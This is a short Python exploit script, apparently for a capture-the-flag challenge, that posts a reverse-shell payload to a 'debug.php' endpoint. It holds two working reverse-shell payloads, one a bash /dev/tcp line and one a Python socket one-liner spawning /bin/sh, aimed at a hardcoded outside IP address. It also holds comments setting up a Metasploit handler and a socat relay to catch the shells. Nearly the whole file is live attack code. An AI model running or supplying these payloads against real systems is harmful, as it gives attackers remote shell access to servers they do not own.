import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ./msfconsole -x 'use multi/handler; set payload cmd/unix/reverse_bash; set lport 1234; set lhost 127.0.0.1; set ExitOnSession false; exploit -j -z' # handle multiple reverse shells
# socat -v tcp-l:80,fork,reuseaddr tcp:127.0.0.1:1234

PROXIES = {'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}

LHOST = '212.83.174.121'
LPORT = 80

# bash
payload = """bash 0</dev/tcp/{0}/{1} 1>&0 2>&0""".format(LHOST, LPORT)

# python
payload = """python -c 'import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{0}",{1}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);'""".replace('\n', ';').format(LHOST, LPORT)

#url = 'https://binarycloud.asis-ctf.ir/debug.php'
url = 'http://127.0.0.1:8080/debug.php'
body = {'x': payload}

r = requests.post(url, data=body, proxies=PROXIES, verify=False)
print('%r' % r.content)
